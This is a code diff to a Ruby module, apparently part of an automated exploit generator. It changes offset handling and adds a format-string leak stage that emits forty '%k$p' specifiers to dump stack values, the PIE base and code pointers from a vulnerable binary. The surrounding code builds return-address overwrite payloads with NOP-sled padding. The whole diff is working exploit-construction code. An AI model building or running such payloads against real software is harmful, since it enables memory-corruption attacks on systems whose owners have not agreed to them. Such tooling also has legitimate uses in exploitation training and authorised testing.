@@ -48,12 +48,17 @@ module Lictor
         offset = AugureProfiler::Triage.offset(binary)
         offset_source = "gdb-cyclic" if offset
       end
-      unless offset
+
+      layouts = layouts_for(technique, packs)
+      # the measured offset serves the return-slot layouts only: the
+      # fmtstr class addresses the stack through the format itself, the
+      # fmt_offset fact carries the buffer's argument index - no return
+      # slot to measure
+      needs_offset = layouts.any? { |(_, layout)| layout.flatten.include?("measured_offset") }
+      unless offset || !needs_offset
         raise BuildError,
           "no measured offset - static analysis found no controlled return and the debugger did not either"
       end
-
-      layouts = layouts_for(technique, packs)
       arch = AugureProfiler.arch(binary)
       width = (arch == :x64) ? "Q<" : "L<"
       body = ret = ret_source = variant = nil
@@ -106,6 +111,26 @@ module Lictor
       ret_source = nil
       layout.each do |slot|
         case slot[0]
+        when "fmtstr_leak"
+          # the leak round: every stack qword from the buffer's own
+          # index rides out as %K$p - the PIE base, the code pointers,
+          # the saved frames. The window is fixed (40 slots): it
+          # reaches the frame chain behind a 256-byte read buffer
+          # (32 buffer qwords + saved rbp + return) while the format
+          # itself still fits that read. The strike derives its
+          # targets from what answers.
+          n = facts["fmt_offset"]&.first&.first
+          unless n
+            raise BuildError,
+              "fmtstr_leak: no fmt_offset fact - the profiler names the buffer's argument index off the frame"
+          end
+
+          n = Integer(n)
+          body << ((n...(n + 40)).map { |k| "%#{k}$p" }.join(" ") + "|")
+          # no return slot rides here: printf consumes the format - the
+          # payload IS the return, the strike derives from what answers
+          ret ||= body.dup
+          ret_source ||= "fmt_offset:#{n}"
         when "padding"
           filler = (slot[2] == "sled") ? "\x90" : "A"
           body << (filler * offset).b
